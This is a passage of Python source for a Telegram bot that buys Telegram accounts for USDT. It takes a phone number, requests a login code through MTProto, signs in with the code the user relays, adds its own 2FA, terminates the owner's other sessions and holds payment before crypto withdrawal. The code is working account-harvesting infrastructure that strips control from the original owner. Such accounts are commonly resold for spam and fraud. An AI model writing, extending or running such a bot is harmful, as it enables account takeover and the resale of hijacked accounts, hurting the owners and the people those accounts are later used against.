        bot.send_message(chat_id, "<b>❌ Cancelled Successfully</b>\n\n<blockquote>✨ The process has been safely aborted.</blockquote>\n\n📱 Send your phone number whenever you want to start again.")

    elif data == 'main_menu':
        try:
            bot.answer_callback_query(call.id, "🏠 Returned to Main Menu")
            bot.delete_message(chat_id, message_id)
        except Exception:
            pass
        if user_id in user_states:
            s_name = user_states[user_id].get('session_name')
            if s_name:
                s_file = f"{s_name}.session"
                if os.path.exists(s_file):
                    try:
                        os.remove(s_file)
                    except:
                        pass
            del user_states[user_id]
        bot.send_message(chat_id, "<b>🏠 Main Menu Dashboard</b>\n\n<blockquote>You are back to the main dashboard.</blockquote>\n\n📱 Send your phone number to proceed further.")

@bot.message_handler(func=lambda message: True)
def handle_text_messages(message):
    executor.submit(process_text_message, message)

def process_text_message(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    text = message.text.strip()

    if not check_user_verification(user_id):
        send_verification_message(chat_id)
        return

    if user_id in user_states:
        state = user_states[user_id]
        
        if 'timer_start' in state and time.time() - state.get('timer_start', 0) > 120:
            del user_states[user_id]
            try:
                bot.delete_message(chat_id, message.message_id)
                if 'last_msg_id' in state:
                    bot.delete_message(chat_id, state['last_msg_id'])
            except Exception:
                pass
            bot.send_message(chat_id, "<b>❌ Time Expired!</b>\n\n<blockquote>The 120-second timer has expired. Your task/process has been cancelled automatically.</blockquote>")
            return

        if state['step'] == 'awaiting_withdraw_address':
            net_type = state['network']
            last_msg_id = state.get('last_msg_id')
            is_valid = False
            
            if net_type == 'BEP20':
                if text.startswith('0x') and len(text) == 42:
                    is_valid = True
            elif net_type == 'TRC20':
                if text.startswith('T') and len(text) == 34:
                    is_valid = True
            
            try:
                bot.delete_message(chat_id, message.message_id)
            except Exception:
                pass
            
            try:
                if last_msg_id:
                    bot.delete_message(chat_id, last_msg_id)
            except Exception:
                pass

            if not is_valid:
                markup = InlineKeyboardMarkup()
                btn_cancel = InlineKeyboardButton('❌ Cancel Withdraw', callback_data='cancel_sale')
                markup.add(btn_cancel)

                new_err_msg = bot.send_message(
                    chat_id,
                    f"<b>❌ Invalid {net_type} Address!</b>\n\n"
                    f"<blockquote>Please provide a valid deposit address format.\n"
                    f"💡 {'BEP20 must start with 0x and be 42 characters long.' if net_type=='BEP20' else 'TRC20 must start with T and be 34 characters long.'}</blockquote>\n\n"
                    f"🔄 Try entering again:",
                    reply_markup=markup
                )
                user_states[user_id]['last_msg_id'] = new_err_msg.message_id
                user_states[user_id]['timer_start'] = time.time()
                return
            
            user_data = get_user_data_from_db(user_id)
            main_bal = float(user_data.get("main", 0))

            if main_bal < 10.00:
                del user_states[user_id]
                bot.send_message(
                    chat_id,
                    f"<b>🔒 Withdrawal Locked!</b>\n\n"
                    f"<blockquote>Your balance is below the minimum withdrawal amount.\n<b>Current Balance: ${main_bal:.2f} USDT</b>.</blockquote>\n\n"
                    f"<b>⚠️ Minimum Withdrawal: $10.00 USDT.</b>"
                )
                return

            withdrawn_amount = f"{main_bal:.2f}"
            raw_main_bal = main_bal

            user_states[user_id] = {
                'step': 'awaiting_withdraw_confirmation',
                'network': net_type,
                'address': text,
                'amount': withdrawn_amount,
                'raw_amount': raw_main_bal,
                'timer_start': time.time()
            }

            confirm_markup = InlineKeyboardMarkup()
            btn_confirm = InlineKeyboardButton('✅ Confirm', callback_data='confirm_withdraw_request')
            btn_cancel = InlineKeyboardButton('❌ Cancel', callback_data='cancel_withdraw_request')
            confirm_markup.add(btn_confirm, btn_cancel)

            confirm_msg_text = (
                f"<b>📋 Confirm Request Details</b>\n\n"
                f"<blockquote>"
                f"💰 Main Balance: <b>${withdrawn_amount} USDT</b>\n"
                f"🌐 Network: <b>{net_type}</b>\n"
                f"📍 Address: <code>{text}</code>\n\n"
                f"⚠️ <i>Please check your address and Confirm your withdraw request within <b>120 seconds</b>.</i>\n"
                f"</blockquote>"
            )
            sent_confirm_msg = bot.send_message(chat_id, confirm_msg_text, reply_markup=confirm_markup)
            user_states[user_id]['last_msg_id'] = sent_confirm_msg.message_id
            return

        elif state['step'] == 'awaiting_otp':
            if time.time() - state.get('timer_start', 0) > 120:
                del user_states[user_id]
                session_file = f"{state['session_name']}.session"
                if os.path.exists(session_file):
                    try:
                        os.remove(session_file)
                    except:
                        pass
                try:
                    bot.delete_message(chat_id, message.message_id)
                    if 'last_msg_id' in state:
                        bot.delete_message(chat_id, state['last_msg_id'])
                except Exception:
                    pass
                bot.send_message(
                    chat_id,
                    "<b>❌ OTP Time Expired!</b>\n\n"
                    "<blockquote>The 120-second timer has expired. This number's verification task has been cancelled automatically.</blockquote>\n\n"
                    "📱 Send your phone number again to restart."
                )
                return

            try:
                if 'last_msg_id' in state:
                    bot.delete_message(chat_id, state['last_msg_id'])
                bot.delete_message(chat_id, message.message_id)
            except Exception:
                pass

            phone_num = state['phone']
            country = state['matched_country']
            country_key = state.get('country_key')
            session_name = state['session_name']
            phone_code_hash = state['phone_code_hash']

            login_result = run_async_login_and_secure(phone_num, text, phone_code_hash, session_name)

            if login_result['status'] == 'has_2fa_active':
                del user_states[user_id]
                session_file = f"{session_name}.session"
                if os.path.exists(session_file):
                    try:
                        os.remove(session_file)
                    except:
                        pass
                bot.send_message(
                    chat_id,
                    f"<b>🔐 2FA Detected! ❌</b>\n\n"
                    f"<blockquote>🔐 This account has 2FA enabled.\n"
                    f"📱 Number: <code>{phone_num}</code>\n"
                    f"⚠️ Please disable 2FA security lock. Since 2FA is active, the session has been cancelled and deleted automatically.</blockquote>"
                )
                return
            
            elif login_result['status'] == 'invalid_code':
                state['attempts'] -= 1
                if state['attempts'] <= 0:
                    del user_states[user_id]
                    session_file = f"{session_name}.session"
                    if os.path.exists(session_file):
                        try:
                            os.remove(session_file)
                        except:
                            pass
                    bot.send_message(chat_id, "<b>❌ Session Terminated & Deleted</b>\n\n<blockquote>The session has been cancelled and deleted due to 3 incorrect OTP code attempts.</blockquote>\n\n🔄 Try again later with a new request.")
                else:
                    markup = InlineKeyboardMarkup()
                    btn_cancel = InlineKeyboardButton('❌ Cancel Sale', callback_data='cancel_sale')
                    markup.add(btn_cancel)

                    err_msg = bot.send_message(
                        chat_id, 
                        f"<b>❌ Invalid OTP Code!</b>\n\n<blockquote>Incorrect verification code! Please try again.\n🔄 Remaining attempts: <b>{state['attempts']}</b> ⏳</blockquote>\n\n📱 Enter the correct 5-digit code:",
                        reply_markup=markup
                    )
                    state['last_msg_id'] = err_msg.message_id
                    state['timer_start'] = time.time()
                return
            
            elif login_result['status'] == 'spammed':
                del user_states[user_id]
                session_file = f"{session_name}.session"
                if os.path.exists(session_file):
                    try:
                        os.remove(session_file)
                    except:
                        pass
                bot.send_message(
                    chat_id,
                    f"<b>❌ Account Spammed & Rejected!</b>\n\n"
                    f"<blockquote>📱 Number: <code>{phone_num}</code>\n"
                    f"🛡️ This account is restricted/spammed. Spammed accounts are not accepted, so the session has been deleted automatically.</blockquote>"
                )
                return

            elif login_result['status'] == 'success':
                add_hold_balance_to_db(user_id, country.get('price', 0), phone_num, country)
                del user_states[user_id]

                try:
                    display_timer_sec = int(country.get('timer', 90000))
                except:
                    display_timer_sec = 90000
                
                display_hours = display_timer_sec / 3600

                logout_success = login_result.get("logout_success", True)
                active_devices = login_result.get("active_devices", [])

                if logout_success:
                    security_text = "🔒 Spam Checked, 2FA Added & Other Sessions Terminated Successfully!"
                else:
                    devices_str = "\n".join([f"• <code>{d}</code>" for d in active_devices]) if active_devices else "• Unknown active devices"
                    security_text = (
                        f"⚠️ <b>Device Logout Notice:</b> Could not automatically logout other sessions due to Telegram's 24h rule.\n"
                        f"Active Devices Found:\n{devices_str}\n\n"
                        f"👉 <b>Please manually logout these devices from your Telegram app immediately!</b>"
                    )

                final_details_msg = (
                    f"<b>✅ Number Logged in Successfully!</b>\n\n"
                    f"<blockquote>"
                    f"🌍 Country: {country.get('name', 'Unknown')} {country.get('flag', '🏳️')}\n"
                    f"📱 Number: <code>{phone_num}</code>\n"
                    f"💰 Price: <b>${float(country.get('price', 0)):.2f} USD</b>\n"
                    f"⏳ Hold Time: <b>{display_hours:.1f} Hours</b>\n"
                    f"{security_text}\n"
                    f"</blockquote>\n\n"
                    f"✨ Your payment will be securely moved to your Main Balance after verification!"
                )
                sent_success_msg = bot.send_message(chat_id, final_details_msg)

                threading.Thread(
                    target=process_account_result_after_delay,
                    args=(chat_id, sent_success_msg.message_id, user_id, phone_num, country, country_key, session_name),
                    daemon=True
                ).start()
            else:
                del user_states[user_id]
                session_file = f"{session_name}.session"
                if os.path.exists(session_file):
                    try:
                        os.remove(session_file)
                    except:
                        pass
                bot.send_message(chat_id, f"<b>❌ Login Failed & Session Deleted</b>\n\n<blockquote>{login_result.get('message', 'Unknown login error occurred')}</blockquote>\n\n📱 Please try again with another number.")
            return

    if text.startswith('+'):
        if is_number_already_used(text):
            bot.send_message(
                chat_id,
                f"<b>❌ Number Already Submitted!</b>\n\n"
                f"<blockquote>"
                f"📱 Number: <code>{text}</code>\n\n"
                f"💡 This phone number has already been submitted or processed in the bot before. Duplicate numbers are not allowed!"
                f"</blockquote>"
            )
            return

        country_codes = get_country_codes_from_db()
        matched_country = None
        matched_country_key = None
        
        sorted_country_items = sorted(country_codes.items(), key=lambda x: len(x[1].get('code', '')) if isinstance(x[1], dict) else 0, reverse=True)
        
        for key, val in sorted_country_items:
            if not isinstance(val, dict):
                continue
            c_code = val.get('code', '')
            if text.startswith(c_code):
                matched_country = val
                matched_country_key = key
                break

        if not matched_country:
            bot.send_message(
                chat_id,
                f"<b>❌ Country Not Available</b>\n"
                f"<blockquote>"
                f"The capacity for this country is full. Please try another country."
                f"</blockquote>"
           ) 
            return

        try:
            available_count = int(matched_country.get('count', 0))
        except:
            available_count = 0

        if available_count <= 0:
            bot.send_message(
                chat_id,
                f"<b>❌ Country Capacity Full!</b>\n\n"
                f"<blockquote>"
                f"🌍 Country: {matched_country.get('name', 'Unknown')} {matched_country.get('flag', '🏳️')}\n"
                f"📦 Available Capacity: <b>0 left</b>\n\n"
                f"💡 Sorry, this country is currently not available in our capacity list. Please check back later or try another country!"
                f"</blockquote>"
            )
            return

        raw_number = text.replace(matched_country.get('code', ''), '')
        
        if len(raw_number) < 7:
            bot.send_message(chat_id, "<b>❌ Number length is too short. Send a valid phone number to proceed. 📱</b>")
            return

        processing_msg = bot.send_message(chat_id, "<b>⏳ Processing OTP Request...</b>\n\n<blockquote>Connecting to Telegram MTProto...</blockquote>\n\nPlease wait a moment...")

        session_name = f"session_{user_id}_{int(time.time())}_{random.randint(100,999)}"
        code_result = run_async_request_code(text, session_name)

        try:
            bot.delete_message(chat_id, processing_msg.message_id)
        except Exception:
            pass

        text_error_msg = code_result.get('message', 'Server error connection')
        if code_result['status'] != 'success':
            session_file = f"{session_name}.session"
            if os.path.exists(session_file):
                try:
                    os.remove(session_file)
                except:
                    pass
            bot.send_message(chat_id, f"<b>❌ OTP Send Failed</b>\n\n<blockquote>{text_error_msg}</blockquote>\n\n🔄 Please try again later.")
            return

        markup = InlineKeyboardMarkup()
        btn_cancel = InlineKeyboardButton('❌ Cancel Sale', callback_data='cancel_sale')
        markup.add(btn_cancel)

        sent_otp_msg = bot.send_message(
            chat_id,
            f"<b>📩 OTP SENT SUCCESSFULLY!</b>\n\n"
            f"<blockquote>We have sent a login verification code to your Telegram account for:\n📞 <b>{text}</b>\n\n✨ Please enter the 5-digit code here within <b>120 seconds</b>: 👇</blockquote>\n\n"
            f"⏳ Waiting for your OTP input...",
            reply_markup=markup
        )
        
        user_states[user_id] = {
            'step': 'awaiting_otp',
            'phone': text,
            'matched_country': matched_country,
            'country_key': matched_country_key,
            'session_name': session_name,
            'phone_code_hash': code_result['phone_code_hash'],
            'last_msg_id': sent_otp_msg.message_id,
            'attempts': 3,
            'timer_start': time.time()
        }
    else:
        if not text.startswith('/'):
            bot.send_message(chat_id, "ℹ️ Send valid phone number to proceed.")

if __name__ == "__main__":
    threading.Thread(target=listen_withdraw_requests, daemon=True).start()
    print("Bot is running...")
    bot.infinity_polling(skip_pending=True)
